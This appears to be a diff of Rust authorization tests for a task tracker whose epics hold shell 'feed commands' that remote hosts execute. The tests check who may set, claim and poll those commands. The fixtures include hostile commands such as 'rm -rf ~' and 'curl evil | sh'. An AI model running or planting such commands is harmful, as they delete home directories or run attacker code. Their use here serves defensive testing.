@@ -220,7 +220,7 @@ async fn a_member_who_only_sees_the_epic_cannot_change_its_feed_command() {
 }
 
 #[tokio::test]
-async fn the_creator_the_poll_owners_owner_and_an_admin_may_change_it() {
+async fn the_creator_and_an_admin_may_change_it() {
     for who in ["bob", "me"] {
         let mut caller = scenario();
         give_claims(&caller);
@@ -231,11 +231,82 @@ async fn the_creator_the_poll_owners_owner_and_an_admin_may_change_it() {
         );
         assert_eq!(caller.lock().epics[&1].feed_command, "rm -rf ~");
     }
-    // The owner of the host that holds the claim, who is neither creator nor admin.
+}
+
+/// Task #98851 (M2): holding the claim is not authorship. A claim is something
+/// any host can take, so the owner of the claiming host has no say over what
+/// the command is.
+#[tokio::test]
+async fn the_owner_of_the_host_holding_the_claim_may_not_change_it() {
     let mut caller = scenario();
     caller.lock().poll_owners.insert(1, claim(1, 1, "h-carol"));
     let outcome = set_command(&mut caller, "carol").await;
+    assert!(matches!(outcome, ReducerOutcome::Refused(_)), "{outcome:?}");
+    assert_eq!(caller.lock().epics[&1].feed_command, "gh-feed");
+}
+
+/// A real change records its author and drops the claims of every host whose
+/// owner is not that person, so the author's own host can claim the feed.
+#[tokio::test]
+async fn changing_the_command_records_the_setter_and_releases_other_claims() {
+    let mut caller = scenario();
+    give_claims(&caller); // h-bob and h-me
+    let outcome = set_command(&mut caller, "me").await; // an admin, not the creator
     assert!(matches!(outcome, ReducerOutcome::Applied(_)), "{outcome:?}");
+    assert_eq!(caller.lock().epics[&1].feed_command_set_by, "me");
+    assert_eq!(claim_hosts(&caller), ["h-me"]);
+}
+
+#[tokio::test]
+async fn keeping_the_command_keeps_the_setter_and_the_claims() {
+    let mut caller = scenario();
+    give_claims(&caller);
+    act_as(&mut caller, "bob");
+    caller
+        .patch_epic(
+            EpicId(1),
+            bindings::EpicPatch {
+                feed_command: Some("gh-feed".into()),
+                title: Some("renamed".into()),
+                ..blank_epic_patch()
+            },
+        )
+        .await
+        .unwrap();
+    assert_eq!(caller.lock().epics[&1].feed_command_set_by, "");
+    assert_eq!(claim_hosts(&caller), ["h-bob", "h-me"]);
+}
+
+/// A new epic that carries a command is a command set by its creator.
+#[tokio::test]
+async fn creating_an_epic_with_a_command_records_its_creator_as_the_setter() {
+    let mut caller = scenario();
+    act_as(&mut caller, "carol");
+    let id = caller
+        .create_epic(bindings::Epic {
+            workspace_id: WS1,
+            feed_command: "curl evil | sh".into(),
+            // A client's claim about who set it is ignored.
+            feed_command_set_by: "bob".into(),
+            ..blank_bindings_epic()
+        })
+        .await
+        .unwrap();
+    assert_eq!(caller.lock().epics[&id.0].feed_command_set_by, "carol");
+}
+
+#[tokio::test]
+async fn creating_an_epic_without_a_command_records_no_setter() {
+    let mut caller = scenario();
+    act_as(&mut caller, "carol");
+    let id = caller
+        .create_epic(bindings::Epic {
+            workspace_id: WS1,
+            ..blank_bindings_epic()
+        })
+        .await
+        .unwrap();
+    assert_eq!(caller.lock().epics[&id.0].feed_command_set_by, "");
 }
 
 #[tokio::test]
@@ -330,4 +401,269 @@ fn another_persons_public_root_is_not_reused_or_rewritten() {
         .epics
         .values()
         .any(|e| e.feed_role == module::ROLE_REVIEWS_PARENT && e.created_by == "carol"));
+}
+
+// -- M2: claiming and overriding need sight, and a feed epic its setter ----------
+
+fn blank_bindings_epic() -> bindings::Epic {
+    module::blank_epic().into()
+}
+
+async fn claim_for(
+    caller: &mut MemoryReducerCaller,
+    who: &str,
+    target: PollScopeId,
+    host: &str,
+) -> ReducerOutcome {
+    act_as(caller, who);
+    caller.claim_poll_owner(target, host.into()).await.unwrap()
+}
+
+async fn override_for(
+    caller: &mut MemoryReducerCaller,
+    who: &str,
+    target: PollScopeId,
+    host: &str,
+) -> ReducerOutcome {
+    act_as(caller, who);
+    caller
+        .override_poll_owner(target, host.into())
+        .await
+        .unwrap()
+}
+
+fn make_private(caller: &MemoryReducerCaller, epic_id: i64) {
+    caller.lock().epics.get_mut(&epic_id).unwrap().visibility = "private".into();
+}
+
+#[tokio::test]
+async fn a_claim_on_an_epic_the_caller_cannot_see_is_refused() {
+    let mut caller = scenario();
+    make_private(&caller, 1); // bob's, so carol cannot see it
+    for out in [
+        claim_for(
+            &mut caller,
+            "carol",
+            PollScopeId::Epic(EpicId(1)),
+            "h-carol",
+        )
+        .await,
+        override_for(
+            &mut caller,
+            "carol",
+            PollScopeId::Epic(EpicId(1)),
+            "h-carol",
+        )
+        .await,
+    ] {
+        assert!(matches!(out, ReducerOutcome::Refused(_)), "{out:?}");
+    }
+    assert!(claim_hosts(&caller).is_empty());
+}
+
+#[tokio::test]
+async fn a_claim_on_a_task_the_caller_cannot_see_is_refused() {
+    let mut caller = scenario();
+    caller.lock().tasks.insert(
+        1,
+        module::Task {
+            id: 1,
+            owner: "bob".into(),
+            ..module::blank_task()
+        },
+    );
+    let out = claim_for(
+        &mut caller,
+        "carol",
+        PollScopeId::Task(TaskId(1)),
+        "h-carol",
+    )
+    .await;
+    assert!(matches!(out, ReducerOutcome::Refused(_)), "{out:?}");
+    let out = claim_for(&mut caller, "bob", PollScopeId::Task(TaskId(1)), "h-bob").await;
+    assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
+}
+
+/// Carol sees bob's public feed epic but her host may not poll a command bob
+/// wrote, claimed or overridden.
+#[tokio::test]
+async fn a_host_whose_owner_did_not_set_the_command_cannot_claim_the_feed() {
+    let mut caller = scenario();
+    for out in [
+        claim_for(
+            &mut caller,
+            "carol",
+            PollScopeId::Epic(EpicId(1)),
+            "h-carol",
+        )
+        .await,
+        override_for(
+            &mut caller,
+            "carol",
+            PollScopeId::Epic(EpicId(1)),
+            "h-carol",
+        )
+        .await,
+    ] {
+        assert!(matches!(out, ReducerOutcome::Refused(_)), "{out:?}");
+    }
+    assert!(claim_hosts(&caller).is_empty());
+    // The creator's own host may (no setter recorded: it falls back to created_by).
+    let out = claim_for(&mut caller, "bob", PollScopeId::Epic(EpicId(1)), "h-bob").await;
+    assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
+    assert_eq!(claim_hosts(&caller), ["h-bob"]);
+}
+
+#[tokio::test]
+async fn a_recorded_setter_wins_over_the_creator() {
+    let mut caller = scenario();
+    caller.lock().epics.get_mut(&1).unwrap().feed_command_set_by = "carol".into();
+    let out = claim_for(&mut caller, "bob", PollScopeId::Epic(EpicId(1)), "h-bob").await;
+    assert!(matches!(out, ReducerOutcome::Refused(_)), "{out:?}");
+    let out = claim_for(
+        &mut caller,
+        "carol",
+        PollScopeId::Epic(EpicId(1)),
+        "h-carol",
+    )
+    .await;
+    assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
+}
+
+#[tokio::test]
+async fn an_epic_without_a_command_can_be_claimed_by_any_host_that_sees_it() {
+    let mut caller = scenario();
+    caller.lock().epics.get_mut(&1).unwrap().feed_command = String::new();
+    let out = claim_for(
+        &mut caller,
+        "carol",
+        PollScopeId::Epic(EpicId(1)),
+        "h-carol",
+    )
+    .await;
+    assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
+}
+
+// -- M4: every loss-of-sight path releases the claims it strands --------------
+
+/// Carol's host holds the claim on epic 1 (bob's, in workspace 1); bob's host
+/// holds one too. A path that takes carol's sight of epic 1 away must release
+/// hers and keep bob's. The graduated check: a new loss-of-sight path adds a
+/// row here, and a path that forgets the release fails it.
+async fn carol_loses_sight_by(path: &str, caller: &mut MemoryReducerCaller) {
+    match path {
+        "remove_member" => {
+            caller.apply_remove_member(3).unwrap(); // carol leaves workspace 1
+        }
+        "move_epic_to_workspace" => {
+            caller
+                .apply_move_epic_to_workspace(EpicId(1), WS2)
+                .unwrap()
+                .applied()
+                .unwrap();
+        }
+        "set_epic_visibility" => {
+            act_as(caller, "bob");
+            caller
+                .apply_set_epic_visibility(EpicId(1), "private".into())
+                .unwrap()
+                .applied()
+                .unwrap();
+        }
+        "reparent_under_a_private_epic" => {
+            caller.lock().epics.insert(
+                2,
+                module::Epic {
+                    visibility: "private".into(),
+                    ..epic(2, WS1, "bob")
+                },
+            );
+            act_as(caller, "bob");
+            caller
+                .patch_epic(
+                    EpicId(1),
+                    bindings::EpicPatch {
+                        parent_epic_id: Some(2),
+                        ..blank_epic_patch()
+                    },
+                )
+                .await
+                .unwrap()
+                .applied()
+                .unwrap();
+        }
+        "managed_root_made_private" => {
+            {
+                let mut t = caller.lock();
+                let root = t.epics.get_mut(&1).unwrap();
+                root.feed_role = module::ROLE_REVIEWS_PARENT.into();
+                root.feed_command = "reviews.sh".into();
+                root.feed_interval_secs = 600;
+            }
+            act_as(caller, "bob");
+            caller
+                .apply_ensure_managed_epics("reviews.sh".into(), 600, String::new(), 0)
+                .unwrap();
+        }
+        other => panic!("unknown loss-of-sight path {other}"),
+    }
+}
+
+const LOSS_OF_SIGHT_PATHS: [&str; 5] = [
+    "remove_member",
+    "move_epic_to_workspace",
+    "set_epic_visibility",
+    "reparent_under_a_private_epic",
+    "managed_root_made_private",
+];
+
+#[tokio::test]
+async fn every_loss_of_sight_path_releases_the_claims_it_strands() {
+    for path in LOSS_OF_SIGHT_PATHS {
+        let mut caller = scenario();
+        {
+            let mut t = caller.lock();
+            // Bob's epic: his host and carol's both hold it (carol's by an
+            // earlier, now-refused kind of claim: a legacy row).
+            for p in [claim(1, 1, "h-bob"), claim(2, 1, "h-carol")] {
+                t.poll_owners.insert(p.id, p);
+            }
+            // Bob stays a member wherever the path leaves the epic.
+            t.memberships.insert(6, member(6, WS2, "bob", "member"));
+        }
+        carol_loses_sight_by(path, &mut caller).await;
+        let hosts = claim_hosts(&caller);
+        assert!(
+            !hosts.contains(&"h-carol".to_string()),
+            "{path}: carol's claim survived: {hosts:?}"
+        );
+        assert!(
+            hosts.contains(&"h-bob".to_string()),
+            "{path}: bob's claim was released: {hosts:?}"
+        );
+    }
+}
+
+/// The sub-epics of a tree that goes private are covered too.
+#[tokio::test]
+async fn a_visibility_flip_also_releases_claims_on_the_sub_epics() {
+    let mut caller = scenario();
+    {
+        let mut t = caller.lock();
+        t.epics.insert(
+            2,
+            module::Epic {
+                parent_epic_id: 1,
+                ..epic(2, WS1, "bob")
+            },
+        );
+        t.poll_owners.insert(1, claim(1, 2, "h-carol"));
+    }
+    act_as(&mut caller, "bob");
+    caller
+        .apply_set_epic_visibility(EpicId(1), "private".into())
+        .unwrap()
+        .applied()
+        .unwrap();
+    assert!(claim_hosts(&caller).is_empty());
 }
